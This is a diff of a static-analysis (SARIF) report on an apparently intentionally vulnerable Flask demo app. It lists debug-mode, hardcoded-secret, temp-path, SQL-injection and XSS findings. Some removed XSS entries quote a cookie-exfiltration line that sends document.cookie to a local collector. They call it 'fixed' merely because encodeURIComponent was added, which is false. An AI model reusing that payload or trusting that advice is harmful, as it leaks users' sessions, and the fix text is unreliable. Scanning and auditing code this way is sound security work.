-              "id": "97e64c28-7e50-3f17-8d12-f4c95004c392",
-              "name": "resources.rules.python.debug-enabled",
-              "shortDescription": {
-                "text": "Opengrep Finding: resources.rules.python.debug-enabled"
-              },
-              "fullDescription": {
-                "text": "Detected Flask app with debug=True. Do not deploy to production with this flag enabled\nas it will leak sensitive information. Instead, consider using Flask configuration\nvariables or setting 'debug' using system environment variables.\n"
-              },
-              "defaultConfiguration": {
-                "enabled": true,
-                "level": "warning"
-              },
-              "help": {
-                "text": "Detected Flask app with debug=True. Do not deploy to production with this flag enabled\nas it will leak sensitive information. Instead, consider using Flask configuration\nvariables or setting 'debug' using system environment variables.\n\n💎 Enable cross-file analysis and Pro rules for free at sg.run/pro",
-                "markdown": "Detected Flask app with debug=True. Do not deploy to production with this flag enabled\nas it will leak sensitive information. Instead, consider using Flask configuration\nvariables or setting 'debug' using system environment variables.\n\n\n#### 💎 Enable cross-file analysis and Pro rules for free at <a href='https://sg.run/pro'>sg.run/pro</a>\n\n<b>References:</b>\n - [https://labs.detectify.com/2015/10/02/how-patreon-got-hacked-publicly-exposed-werkzeug-debugger/](https://labs.detectify.com/2015/10/02/how-patreon-got-hacked-publicly-exposed-werkzeug-debugger/)\n"
-              },
-              "properties": {
-                "precision": "very-high"
-              }
-            },
-            {
               "id": "2ff2030d-855f-3948-a4fb-62cb9d31c714",
               "name": "resources.rules.python.avoid_hardcoded_config_SECRET_KEY",
               "shortDescription": {
@@ -743,6 +745,27 @@
               "help": {
                 "text": "Hardcoded variable `SECRET_KEY` detected. Use environment variables or config files instead\n💎 Enable cross-file analysis and Pro rules for free at sg.run/pro",
                 "markdown": "Hardcoded variable `SECRET_KEY` detected. Use environment variables or config files instead\n\n#### 💎 Enable cross-file analysis and Pro rules for free at <a href='https://sg.run/pro'>sg.run/pro</a>\n\n<b>References:</b>\n - [https://bento.dev/checks/flask/avoid-hardcoded-config/](https://bento.dev/checks/flask/avoid-hardcoded-config/)\n - [https://flask.palletsprojects.com/en/1.1.x/config/?highlight=configuration#builtin-configuration-values](https://flask.palletsprojects.com/en/1.1.x/config/?highlight=configuration#builtin-configuration-values)\n - [https://flask.palletsprojects.com/en/1.1.x/config/?highlight=configuration#environment-and-debug-features](https://flask.palletsprojects.com/en/1.1.x/config/?highlight=configuration#environment-and-debug-features)\n"
+              },
+              "properties": {
+                "precision": "very-high"
+              }
+            },
+            {
+              "id": "97e64c28-7e50-3f17-8d12-f4c95004c392",
+              "name": "resources.rules.python.debug-enabled",
+              "shortDescription": {
+                "text": "Opengrep Finding: resources.rules.python.debug-enabled"
+              },
+              "fullDescription": {
+                "text": "Detected Flask app with debug=True. Do not deploy to production with this flag enabled\nas it will leak sensitive information. Instead, consider using Flask configuration\nvariables or setting 'debug' using system environment variables.\n"
+              },
+              "defaultConfiguration": {
+                "enabled": true,
+                "level": "warning"
+              },
+              "help": {
+                "text": "Detected Flask app with debug=True. Do not deploy to production with this flag enabled\nas it will leak sensitive information. Instead, consider using Flask configuration\nvariables or setting 'debug' using system environment variables.\n\n💎 Enable cross-file analysis and Pro rules for free at sg.run/pro",
+                "markdown": "Detected Flask app with debug=True. Do not deploy to production with this flag enabled\nas it will leak sensitive information. Instead, consider using Flask configuration\nvariables or setting 'debug' using system environment variables.\n\n\n#### 💎 Enable cross-file analysis and Pro rules for free at <a href='https://sg.run/pro'>sg.run/pro</a>\n\n<b>References:</b>\n - [https://labs.detectify.com/2015/10/02/how-patreon-got-hacked-publicly-exposed-werkzeug-debugger/](https://labs.detectify.com/2015/10/02/how-patreon-got-hacked-publicly-exposed-werkzeug-debugger/)\n"
               },
               "properties": {
                 "precision": "very-high"
@@ -770,21 +793,22 @@
               }
             },
             {
-              "id": "3b5975f3-e6c9-38c2-b56b-574f35d2e034",
-              "name": "resources.rules.python.hardcoded-tmp-path",
+              "id": "956c2fb1-004b-31dd-a6f5-47cf59144ade",
+              "name": "python.flask.security.audit.debug-enabled.debug-enabled",
               "shortDescription": {
-                "text": "Opengrep Finding: resources.rules.python.hardcoded-tmp-path"
+                "text": "Opengrep Finding: python.flask.security.audit.debug-enabled.debug-enabled"
               },
               "fullDescription": {
-                "text": "Detected hardcoded temp directory. Consider using 'tempfile.TemporaryFile' instead.\n"
+                "text": "Detected Flask app with debug=True. Do not deploy to production with this flag enabled as it will leak sensitive information. Instead, consider using Flask configuration variables or setting 'debug' using system environment variables."
               },
               "defaultConfiguration": {
                 "enabled": true,
                 "level": "warning"
               },
+              "helpUri": "https://semgrep.dev/r/python.flask.security.audit.debug-enabled.debug-enabled",
               "help": {
-                "text": "Detected hardcoded temp directory. Consider using 'tempfile.TemporaryFile' instead.\n\n💎 Enable cross-file analysis and Pro rules for free at sg.run/pro",
-                "markdown": "Detected hardcoded temp directory. Consider using 'tempfile.TemporaryFile' instead.\n\n\n#### 💎 Enable cross-file analysis and Pro rules for free at <a href='https://sg.run/pro'>sg.run/pro</a>\n\n<b>References:</b>\n - [https://docs.python.org/3/library/tempfile.html#tempfile.TemporaryFile](https://docs.python.org/3/library/tempfile.html#tempfile.TemporaryFile)\n"
+                "text": "Detected Flask app with debug=True. Do not deploy to production with this flag enabled as it will leak sensitive information. Instead, consider using Flask configuration variables or setting 'debug' using system environment variables.\n💎 Enable cross-file analysis and Pro rules for free at sg.run/pro",
+                "markdown": "Detected Flask app with debug=True. Do not deploy to production with this flag enabled as it will leak sensitive information. Instead, consider using Flask configuration variables or setting 'debug' using system environment variables.\n\n#### 💎 Enable cross-file analysis and Pro rules for free at <a href='https://sg.run/pro'>sg.run/pro</a>\n\n<b>References:</b>\n - [Semgrep Rule](https://semgrep.dev/r/python.flask.security.audit.debug-enabled.debug-enabled)\n - [https://labs.detectify.com/2015/10/02/how-patreon-got-hacked-publicly-exposed-werkzeug-debugger/](https://labs.detectify.com/2015/10/02/how-patreon-got-hacked-publicly-exposed-werkzeug-debugger/)\n"
               },
               "properties": {
                 "precision": "very-high"
@@ -827,6 +851,27 @@
               "help": {
                 "text": "Detected Flask app with debug=True. Do not deploy to production with this flag enabled\nas it will leak sensitive information. Instead, consider using Flask configuration\nvariables or setting 'debug' using system environment variables.\n\n💎 Enable cross-file analysis and Pro rules for free at sg.run/pro",
                 "markdown": "Detected Flask app with debug=True. Do not deploy to production with this flag enabled\nas it will leak sensitive information. Instead, consider using Flask configuration\nvariables or setting 'debug' using system environment variables.\n\n\n#### 💎 Enable cross-file analysis and Pro rules for free at <a href='https://sg.run/pro'>sg.run/pro</a>\n\n<b>References:</b>\n - [https://labs.detectify.com/2015/10/02/how-patreon-got-hacked-publicly-exposed-werkzeug-debugger/](https://labs.detectify.com/2015/10/02/how-patreon-got-hacked-publicly-exposed-werkzeug-debugger/)\n"
+              },
+              "properties": {
+                "precision": "very-high"
+              }
+            },
+            {
+              "id": "3b5975f3-e6c9-38c2-b56b-574f35d2e034",
+              "name": "resources.rules.python.hardcoded-tmp-path",
+              "shortDescription": {
+                "text": "Opengrep Finding: resources.rules.python.hardcoded-tmp-path"
+              },
+              "fullDescription": {
+                "text": "Detected hardcoded temp directory. Consider using 'tempfile.TemporaryFile' instead.\n"
+              },
+              "defaultConfiguration": {
+                "enabled": true,
+                "level": "warning"
+              },
+              "help": {
+                "text": "Detected hardcoded temp directory. Consider using 'tempfile.TemporaryFile' instead.\n\n💎 Enable cross-file analysis and Pro rules for free at sg.run/pro",
+                "markdown": "Detected hardcoded temp directory. Consider using 'tempfile.TemporaryFile' instead.\n\n\n#### 💎 Enable cross-file analysis and Pro rules for free at <a href='https://sg.run/pro'>sg.run/pro</a>\n\n<b>References:</b>\n - [https://docs.python.org/3/library/tempfile.html#tempfile.TemporaryFile](https://docs.python.org/3/library/tempfile.html#tempfile.TemporaryFile)\n"
               },
               "properties": {
                 "precision": "very-high"
@@ -896,7 +941,7 @@
               }
             },
             {
-              "id": "8b89cc8a-016b-303a-997a-89271b160e26",
+              "id": "5670c2c8-51c9-3c88-974e-11a862f02b78",
               "name": "resources.rules.python.hardcoded-tmp-path",
               "shortDescription": {
                 "text": "Opengrep Finding: resources.rules.python.hardcoded-tmp-path"
@@ -917,7 +962,7 @@
               }
             },
             {
-              "id": "0dda459c-4d45-3686-b98b-d6bb6f13f849",
+              "id": "8b89cc8a-016b-303a-997a-89271b160e26",
               "name": "resources.rules.python.hardcoded-tmp-path",
               "shortDescription": {
                 "text": "Opengrep Finding: resources.rules.python.hardcoded-tmp-path"
@@ -959,7 +1004,49 @@
               }
             },
             {
-              "id": "5670c2c8-51c9-3c88-974e-11a862f02b78",
+              "id": "0dda459c-4d45-3686-b98b-d6bb6f13f849",
+              "name": "resources.rules.python.hardcoded-tmp-path",
+              "shortDescription": {
+                "text": "Opengrep Finding: resources.rules.python.hardcoded-tmp-path"
+              },
+              "fullDescription": {
+                "text": "Detected hardcoded temp directory. Consider using 'tempfile.TemporaryFile' instead.\n"
+              },
+              "defaultConfiguration": {
+                "enabled": true,
+                "level": "warning"
+              },
+              "help": {
+                "text": "Detected hardcoded temp directory. Consider using 'tempfile.TemporaryFile' instead.\n\n💎 Enable cross-file analysis and Pro rules for free at sg.run/pro",
+                "markdown": "Detected hardcoded temp directory. Consider using 'tempfile.TemporaryFile' instead.\n\n\n#### 💎 Enable cross-file analysis and Pro rules for free at <a href='https://sg.run/pro'>sg.run/pro</a>\n\n<b>References:</b>\n - [https://docs.python.org/3/library/tempfile.html#tempfile.TemporaryFile](https://docs.python.org/3/library/tempfile.html#tempfile.TemporaryFile)\n"
+              },
+              "properties": {
+                "precision": "very-high"
+              }
+            },
+            {
+              "id": "1d21346a-3446-367e-b7f6-1448f336d246",
+              "name": "resources.rules.python.use-raise-for-status",
+              "shortDescription": {
+                "text": "Opengrep Finding: resources.rules.python.use-raise-for-status"
+              },
+              "fullDescription": {
+                "text": "There's an HTTP request made with requests,\nbut the raise_for_status() utility method isn't used.\nThis can result in request errors going unnoticed\nand your code behaving in unexpected ways,\nsuch as if your authorization API returns a 500 error\nwhile you're only checking for a 401."
+              },
+              "defaultConfiguration": {
+                "enabled": true,
+                "level": "warning"
+              },
+              "help": {
+                "text": "There's an HTTP request made with requests,\nbut the raise_for_status() utility method isn't used.\nThis can result in request errors going unnoticed\nand your code behaving in unexpected ways,\nsuch as if your authorization API returns a 500 error\nwhile you're only checking for a 401.\n💎 Enable cross-file analysis and Pro rules for free at sg.run/pro",
+                "markdown": "There's an HTTP request made with requests,\nbut the raise_for_status() utility method isn't used.\nThis can result in request errors going unnoticed\nand your code behaving in unexpected ways,\nsuch as if your authorization API returns a 500 error\nwhile you're only checking for a 401.\n\n#### 💎 Enable cross-file analysis and Pro rules for free at <a href='https://sg.run/pro'>sg.run/pro</a>\n\n<b>References:</b>\n - [https://requests.readthedocs.io/en/master/api/#requests.Response.raise_for_status](https://requests.readthedocs.io/en/master/api/#requests.Response.raise_for_status)\n"
+              },
+              "properties": {
+                "precision": "very-high"
+              }
+            },
+            {
+              "id": "802592d1-b629-355d-ae39-fd4bea678bc2",
               "name": "resources.rules.python.hardcoded-tmp-path",
               "shortDescription": {
                 "text": "Opengrep Finding: resources.rules.python.hardcoded-tmp-path"
@@ -1001,27 +1088,6 @@
               }
             },
             {
-              "id": "1d21346a-3446-367e-b7f6-1448f336d246",
-              "name": "resources.rules.python.use-raise-for-status",
-              "shortDescription": {
-                "text": "Opengrep Finding: resources.rules.python.use-raise-for-status"
-              },
-              "fullDescription": {
-                "text": "There's an HTTP request made with requests,\nbut the raise_for_status() utility method isn't used.\nThis can result in request errors going unnoticed\nand your code behaving in unexpected ways,\nsuch as if your authorization API returns a 500 error\nwhile you're only checking for a 401."
-              },
-              "defaultConfiguration": {
-                "enabled": true,
-                "level": "warning"
-              },
-              "help": {
-                "text": "There's an HTTP request made with requests,\nbut the raise_for_status() utility method isn't used.\nThis can result in request errors going unnoticed\nand your code behaving in unexpected ways,\nsuch as if your authorization API returns a 500 error\nwhile you're only checking for a 401.\n💎 Enable cross-file analysis and Pro rules for free at sg.run/pro",
-                "markdown": "There's an HTTP request made with requests,\nbut the raise_for_status() utility method isn't used.\nThis can result in request errors going unnoticed\nand your code behaving in unexpected ways,\nsuch as if your authorization API returns a 500 error\nwhile you're only checking for a 401.\n\n#### 💎 Enable cross-file analysis and Pro rules for free at <a href='https://sg.run/pro'>sg.run/pro</a>\n\n<b>References:</b>\n - [https://requests.readthedocs.io/en/master/api/#requests.Response.raise_for_status](https://requests.readthedocs.io/en/master/api/#requests.Response.raise_for_status)\n"
-              },
-              "properties": {
-                "precision": "very-high"
-              }
-            },
-            {
               "id": "b372fb82-8b68-3a4e-8d7c-98ee30cf430c",
               "name": "resources.rules.python.hardcoded-tmp-path",
               "shortDescription": {
@@ -1043,28 +1109,7 @@
               }
             },
             {
-              "id": "802592d1-b629-355d-ae39-fd4bea678bc2",
-              "name": "resources.rules.python.hardcoded-tmp-path",
-              "shortDescription": {
-                "text": "Opengrep Finding: resources.rules.python.hardcoded-tmp-path"
-              },
-              "fullDescription": {
-                "text": "Detected hardcoded temp directory. Consider using 'tempfile.TemporaryFile' instead.\n"
-              },
-              "defaultConfiguration": {
-                "enabled": true,
-                "level": "warning"
-              },
-              "help": {
-                "text": "Detected hardcoded temp directory. Consider using 'tempfile.TemporaryFile' instead.\n\n💎 Enable cross-file analysis and Pro rules for free at sg.run/pro",
-                "markdown": "Detected hardcoded temp directory. Consider using 'tempfile.TemporaryFile' instead.\n\n\n#### 💎 Enable cross-file analysis and Pro rules for free at <a href='https://sg.run/pro'>sg.run/pro</a>\n\n<b>References:</b>\n - [https://docs.python.org/3/library/tempfile.html#tempfile.TemporaryFile](https://docs.python.org/3/library/tempfile.html#tempfile.TemporaryFile)\n"
-              },
-              "properties": {
-                "precision": "very-high"
-              }
-            },
-            {
-              "id": "6cb28d21-1aed-3e2b-840b-d9b7cab4cf53",
+              "id": "c377ef54-28cc-3b95-a01c-b699f7daab61",
               "name": "resources.rules.python.hardcoded-tmp-path",
               "shortDescription": {
                 "text": "Opengrep Finding: resources.rules.python.hardcoded-tmp-path"
@@ -1106,6 +1151,27 @@
               }
             },
             {
+              "id": "6cb28d21-1aed-3e2b-840b-d9b7cab4cf53",
+              "name": "resources.rules.python.hardcoded-tmp-path",
+              "shortDescription": {
+                "text": "Opengrep Finding: resources.rules.python.hardcoded-tmp-path"
+              },
+              "fullDescription": {
+                "text": "Detected hardcoded temp directory. Consider using 'tempfile.TemporaryFile' instead.\n"
+              },
+              "defaultConfiguration": {
+                "enabled": true,
+                "level": "warning"
+              },
+              "help": {
+                "text": "Detected hardcoded temp directory. Consider using 'tempfile.TemporaryFile' instead.\n\n💎 Enable cross-file analysis and Pro rules for free at sg.run/pro",
+                "markdown": "Detected hardcoded temp directory. Consider using 'tempfile.TemporaryFile' instead.\n\n\n#### 💎 Enable cross-file analysis and Pro rules for free at <a href='https://sg.run/pro'>sg.run/pro</a>\n\n<b>References:</b>\n - [https://docs.python.org/3/library/tempfile.html#tempfile.TemporaryFile](https://docs.python.org/3/library/tempfile.html#tempfile.TemporaryFile)\n"
+              },
+              "properties": {
+                "precision": "very-high"
+              }
+            },
+            {
               "id": "5ab458d0-c4bb-3392-9c00-6b2bb63732b8",
               "name": "resources.rules.python.hardcoded-tmp-path",
               "shortDescription": {
@@ -1127,24 +1193,25 @@
               }
             },
             {
-              "id": "c377ef54-28cc-3b95-a01c-b699f7daab61",
-              "name": "resources.rules.python.hardcoded-tmp-path",
-              "shortDescription": {
-                "text": "Opengrep Finding: resources.rules.python.hardcoded-tmp-path"
-              },
-              "fullDescription": {
-                "text": "Detected hardcoded temp directory. Consider using 'tempfile.TemporaryFile' instead.\n"
-              },
-              "defaultConfiguration": {
-                "enabled": true,
-                "level": "warning"
-              },
+              "id": "f4cd44b8-df7f-358c-ae49-115800bd61a3",
+              "name": "SQL Injection Vulnerability via String-Based Query Construction",
+              "helpUri": "https://www.glog.ai/",
               "help": {
-                "text": "Detected hardcoded temp directory. Consider using 'tempfile.TemporaryFile' instead.\n\n💎 Enable cross-file analysis and Pro rules for free at sg.run/pro",
-                "markdown": "Detected hardcoded temp directory. Consider using 'tempfile.TemporaryFile' instead.\n\n\n#### 💎 Enable cross-file analysis and Pro rules for free at <a href='https://sg.run/pro'>sg.run/pro</a>\n\n<b>References:</b>\n - [https://docs.python.org/3/library/tempfile.html#tempfile.TemporaryFile](https://docs.python.org/3/library/tempfile.html#tempfile.TemporaryFile)\n"
+                "text": "",
+                "markdown": "## Description\n\nSQL Injection Vulnerability via String-Based Query Construction is a common security vulnerability in Python programming language. It occurs when an application uses user input to construct SQL queries without properly sanitizing it. This allows an attacker to manipulate the SQL query to perform unauthorized actions, such as viewing, modifying, or deleting data.\n\nIn the provided code snippet, the application is using string formatting to construct an SQL query. This makes it vulnerable to SQL injection attacks if the user input (`u` and `p`) is not properly sanitized.\n\n## Mitigation Advice\n\nTo mitigate this vulnerability, you should avoid using string formatting to construct SQL queries. Instead, use parameterized queries or prepared statements, which can ensure that user input is properly sanitized and cannot be used to manipulate the SQL query.\n\n## Source Code Fix Recommendation\n\nHere is a fixed version of the provided code snippet using parameterized queries:\n\n```python\nc.execute(\"INSERT INTO users (user, password, failures) VALUES (?, ?, ?)\", (u, p, 0))\n```\n\n## Library Dependencies\n\nThe provided code snippet requires the `sqlite3` library to execute properly.\n\n## OWASP Resources\n\n- [OWASP Python Security - SQL Injection](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)\n- [OWASP Top 10 2017 Category A1 - Injection](https://owasp.org/www-project-top-ten/2017/A1_2017-Injection)\n\n## Common Weakness Enumeration (CWE)\n\n- [CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')](https://cwe.mitre.org/data/definitions/89.html)"
               },
               "properties": {
-                "precision": "very-high"
+                "cwe": [
+                  {
+                    "id": "CWE-89",
+                    "url": "https://cwe.mitre.org/data/definitions/89.html"
+                  }
+                ],
+                "severity": "MEDIUM",
+                "kind": "FAIL",
+                "tags": [
+                  "CWE-89"
+                ]
               }
             },
             {
@@ -1192,78 +1259,12 @@
               }
             },
             {
-              "id": "bf1be167-8506-3297-8bf9-f8b9ec2b12d4",
-              "name": "\"Potential XSS Vulnerability from User-Controlled Data in HTML String\"",
-              "helpUri": "https://www.glog.ai/",
-              "help": {
-                "text": "",
-                "markdown": "## Description\n\nCross-Site Scripting (XSS) vulnerabilities occur when data enters a program from an untrusted source and is used to generate dynamic HTML content. The vulnerability in the provided JavaScript code snippet is a potential XSS vulnerability because it uses user-controlled data (in this case, a cookie) to construct a URL for an image source. An attacker could manipulate the cookie to inject malicious scripts, which would then be executed when the image source URL is processed.\n\n## Mitigation Advice\n\nTo mitigate this vulnerability, you should always encode user-controlled data before using it to generate HTML content. This can be done using JavaScript's built-in encoding functions or by using a trusted library that provides secure encoding functions. Additionally, you should use HTTP-only cookies to prevent JavaScript from accessing sensitive cookies.\n\n## Source Code Fix\n\nHere is a fixed version of the provided code snippet:\n\n```javascript\nnew Image().src = 'http://127.0.0.1:8000/cookie?c=' + encodeURIComponent(document.cookie);\n```\n\nIn this fixed version, the `encodeURIComponent` function is used to securely encode the cookie before it is used to construct the image source URL.\n\n## Library Dependencies\n\nThe provided code snippet does not require any library dependencies to execute properly. It uses only built-in JavaScript functions and properties.\n\n## OWASP and CWE Resources\n\n- [OWASP XSS (Cross Site Scripting) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)\n- [CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')](https://cwe.mitre.org/data/definitions/79.html)"
-              },
-              "properties": {
-                "cwe": [
-                  {
-                    "id": "CWE-79",
-                    "url": "https://cwe.mitre.org/data/definitions/79.html"
-                  }
-                ],
-                "severity": "MEDIUM",
-                "kind": "FAIL",
-                "tags": [
-                  "CWE-79"
-                ]
-              }
-            },
-            {
-              "id": "f4cd44b8-df7f-358c-ae49-115800bd61a3",
-              "name": "SQL Injection Vulnerability via String-Based Query Construction",
-              "helpUri": "https://www.glog.ai/",
-              "help": {
-                "text": "",
-                "markdown": "## Description\n\nSQL Injection Vulnerability via String-Based Query Construction is a common security vulnerability in Python programming language. It occurs when an application uses user input to construct SQL queries without properly sanitizing it. This allows an attacker to manipulate the SQL query to perform unauthorized actions, such as viewing, modifying, or deleting data.\n\nIn the provided code snippet, the application is using string formatting to construct an SQL query. This makes it vulnerable to SQL injection attacks if the user input (`u` and `p`) is not properly sanitized.\n\n## Mitigation Advice\n\nTo mitigate this vulnerability, you should avoid using string formatting to construct SQL queries. Instead, use parameterized queries or prepared statements, which can ensure that user input is properly sanitized and cannot be used to manipulate the SQL query.\n\n## Source Code Fix Recommendation\n\nHere is a fixed version of the provided code snippet using parameterized queries:\n\n```python\nc.execute(\"INSERT INTO users (user, password, failures) VALUES (?, ?, ?)\", (u, p, 0))\n```\n\n## Library Dependencies\n\nThe provided code snippet requires the `sqlite3` library to execute properly.\n\n## OWASP Resources\n\n- [OWASP Python Security - SQL Injection](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)\n- [OWASP Top 10 2017 Category A1 - Injection](https://owasp.org/www-project-top-ten/2017/A1_2017-Injection)\n\n## Common Weakness Enumeration (CWE)\n\n- [CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')](https://cwe.mitre.org/data/definitions/89.html)"
-              },
-              "properties": {
-                "cwe": [
-                  {
-                    "id": "CWE-89",
-                    "url": "https://cwe.mitre.org/data/definitions/89.html"
-                  }
-                ],
-                "severity": "MEDIUM",
-                "kind": "FAIL",
-                "tags": [
-                  "CWE-89"
-                ]
-              }
-            },
-            {
-              "id": "dc4a0e19-fe3b-3387-b751-5b7d7cfb0cda",
-              "name": "\"Potential XSS Vulnerability from User-Controlled Data in HTML String\"",
-              "helpUri": "https://www.glog.ai/",
-              "help": {
-                "text": "",
-                "markdown": "## Description\n\nCross-Site Scripting (XSS) vulnerabilities occur when data enters a program from an untrusted source and is used to generate dynamic HTML content. The vulnerability in the provided JavaScript code snippet is a potential XSS vulnerability because it uses user-controlled data (in this case, a cookie) to construct a URL for an image source. An attacker could manipulate the cookie to inject malicious scripts, which would then be executed when the image source URL is processed.\n\n## Mitigation Advice\n\nTo mitigate this vulnerability, you should always encode user-controlled data before using it to generate HTML content. This can be done using JavaScript's built-in encoding functions or by using a trusted library that provides secure encoding functions. Additionally, you should use HTTP-only cookies to prevent JavaScript from accessing sensitive cookies.\n\n## Source Code Fix\n\nHere is a fixed version of the provided code snippet:\n\n```javascript\nnew Image().src = 'http://127.0.0.1:8000/cookie?c=' + encodeURIComponent(document.cookie);\n```\n\nIn this fixed version, the `encodeURIComponent` function is used to securely encode the cookie before it is used to construct the image source URL.\n\n## Library Dependencies\n\nThe provided code snippet does not require any library dependencies to execute properly. It uses only built-in JavaScript functions and properties.\n\n## OWASP and CWE Resources\n\n- [OWASP XSS (Cross Site Scripting) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)\n- [CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')](https://cwe.mitre.org/data/definitions/79.html)"
-              },
-              "properties": {
-                "cwe": [
-                  {
-                    "id": "CWE-79",
-                    "url": "https://cwe.mitre.org/data/definitions/79.html"
-                  }
-                ],
-                "severity": "MEDIUM",
-                "kind": "FAIL",
-                "tags": [
-                  "CWE-79"
-                ]
-              }
-            },
-            {
-              "id": "8fdc682e-a47e-338e-a4d6-13373398e33f",
+              "id": "563d99e8-bbca-3a4d-b821-042b6999c80e",
               "name": "Potential Unsafe Use of Temporary File/Directory",
               "helpUri": "https://www.glog.ai/",
               "help": {
                 "text": "",
-                "markdown": "## Description\n\nThe \"Potential Unsafe Use of Temporary File/Directory\" vulnerability in Python refers to the risk associated with the use of temporary files or directories in an insecure manner. This can lead to various security issues such as unauthorized data access, data corruption, or even code execution.\n\nIn the provided code snippet, the application is using a temporary directory (`/tmp`) to store SSL certificate and key files. This is a security risk because the `/tmp` directory is world-writable, meaning any user or process on the system can write to it. An attacker could potentially replace the SSL certificate and key files with their own, leading to a Man-in-the-Middle (MitM) attack.\n\n## Mitigation Advice\n\nTo mitigate this vulnerability, you should avoid storing sensitive files in world-writable directories. Instead, store them in a secure location that only the application has access to. Also, ensure that the files are properly protected with the correct permissions.\n\n## Source Code Fix Recommendation\n\n```python\napp.run(debug=True, host='127.0.1.1', ssl_context=('/secure/path/to/acme.cert', '/secure/path/to/acme.key'))\n```\n\nReplace `/tmp/acme.cert` and `/tmp/acme.key` with the path to a secure directory that only the application has access to.\n\n## Library Dependencies\n\nThe code example requires the Flask library to execute properly.\n\n```bash\npip install flask\n```\n\n## References\n\n- [CWE-377: Insecure Temporary File](https://cwe.mitre.org/data/definitions/377.html)"
+                "markdown": "## Description\n\nThe \"Potential Unsafe Use of Temporary File/Directory\" vulnerability in Python refers to the risk associated with the use of temporary files or directories in an insecure manner. This can lead to various security issues such as unauthorized data access, data corruption, or even code execution.\n\nIn the provided code snippet, the application is using a temporary directory (`/tmp/`) to store SSL certificate and key files. This is a security risk because the `/tmp/` directory is world-writable, meaning any user or process on the system can write to this directory. An attacker could potentially replace the SSL certificate and key files with their own, leading to a Man-in-the-Middle (MitM) attack.\n\n## Mitigation Advice\n\nTo mitigate this vulnerability, you should avoid storing sensitive files in world-writable directories. Instead, store these files in a secure location that only the application has access to. \n\n## Source Code Fix Recommendation\n\n```python\napp.run(debug=True, host='127.0.1.1', ssl_context=('/secure/path/to/acme.cert', '/secure/path/to/acme.key'))\n```\n\nReplace `/secure/path/to/` with the actual secure path where you stored the SSL certificate and key files.\n\n## Library Dependencies\n\nThe code example requires the Flask library to execute properly.\n\n```bash\npip install flask\n```\n\n## References\n\n- [CWE-377: Insecure Temporary File](https://cwe.mitre.org/data/definitions/377.html)"
               },
               "properties": {
                 "cwe": [
@@ -1322,6 +1323,28 @@
                   "CWE-377"
                 ]
               }
+            },
+            {
+              "id": "46755491-b0f8-316f-a803-209b104c5c01",
+              "name": "Flask App Debug Mode Vulnerability",
+              "helpUri": "https://www.glog.ai/",
+              "help": {
+                "text": "",
+                "markdown": "## Description\n\nThe Flask App Debug Mode Vulnerability in Python programming language refers to the situation where the debug mode in a Flask application is left enabled in a production environment. This can lead to serious security issues as it allows execution of arbitrary Python code, potentially granting an attacker full access to the application and its data.\n\nWhen the debug mode is enabled (debug=True), an interactive debugger is activated and it can be accessed via the web browser. This debugger allows the execution of arbitrary code, which can be exploited by an attacker to run malicious code.\n\n## Mitigation Advice\n\nTo mitigate this vulnerability, it is recommended to never enable the debug mode in a production environment. The debug mode should only be used during the development phase. In a production environment, it is recommended to handle errors in a way that does not expose any sensitive information to the users.\n\n## Source Code Fix Recommendation\n\nThe debug mode can be disabled by setting the debug parameter to False when running the application:\n\n```python\napp.run(debug=False, host='127.0.1.1', port=5001, extra_files='csp.txt')\n```\n\n## Library Dependencies\n\nThe code example requires the Flask library to execute properly.\n\n## References\n\n- [CWE-489: Active Debug Code](https://cwe.mitre.org/data/definitions/489.html)"
+              },
+              "properties": {
+                "cwe": [
+                  {
+                    "id": "CWE-489",
+                    "url": "https://cwe.mitre.org/data/definitions/489.html"
+                  }
+                ],
+                "severity": "HIGH",
+                "kind": "FAIL",
+                "tags": [
+                  "CWE-489"
+                ]
+              }
             }
           ],
           "language": "en-US",
@@ -1366,37 +1389,6 @@
           "properties": {}
         },
         {
-          "ruleId": "a863a129-f894-3b6d-a8fe-740a9856d333",
-          "kind": "fail",
-          "level": "warning",
-          "message": {
-            "text": "Detected a request using 'http://'. This request will be unencrypted, and attackers could listen into traffic on the network and be able to obtain sensitive information. Use 'https://' instead."
-          },
-          "locations": [
-            {
-              "physicalLocation": {
-                "artifactLocation": {
-                  "uri": "bad/api_list.py",
-                  "uriBaseId": "%SRCROOT%"
-                },
-                "region": {
-                  "startLine": 10,
-                  "startColumn": 22,
-                  "endLine": 10,
-                  "endColumn": 74,
-                  "snippet": {
-                    "text": "    r = requests.get('http://127.0.1.1:5000/api/post/{}'.format(username))"
-                  }
-                }
-              }
-            }
-          ],
-          "fingerprints": {
-            "matchBasedId/v1": "40876ce372da07f0b79a3c1a0513038c4c5be2b465c3111b06e784f1538ea5a0615e9db360765de8fc4db609df79f090fc9eaf44865dcea94c17e6391399438b_0"
-          },
-          "properties": {}
-        },
-        {
           "ruleId": "4568ce1f-fc76-3ccb-a679-bad6f90690a6",
           "kind": "fail",
           "level": "warning",
@@ -1428,11 +1420,42 @@
           "properties": {}
         },
         {
+          "ruleId": "a863a129-f894-3b6d-a8fe-740a9856d333",
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "Detected a request using 'http://'. This request will be unencrypted, and attackers could listen into traffic on the network and be able to obtain sensitive information. Use 'https://' instead."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "bad/api_list.py",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 10,
+                  "startColumn": 22,
+                  "endLine": 10,
+                  "endColumn": 74,
+                  "snippet": {
+                    "text": "    r = requests.get('http://127.0.1.1:5000/api/post/{}'.format(username))"
+                  }
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "matchBasedId/v1": "40876ce372da07f0b79a3c1a0513038c4c5be2b465c3111b06e784f1538ea5a0615e9db360765de8fc4db609df79f090fc9eaf44865dcea94c17e6391399438b_0"
+          },
+          "properties": {}
+        },
+        {
           "ruleId": "082f3d8e-81f3-359b-919e-cb1aa8dca6e2",
           "kind": "fail",
           "level": "warning",
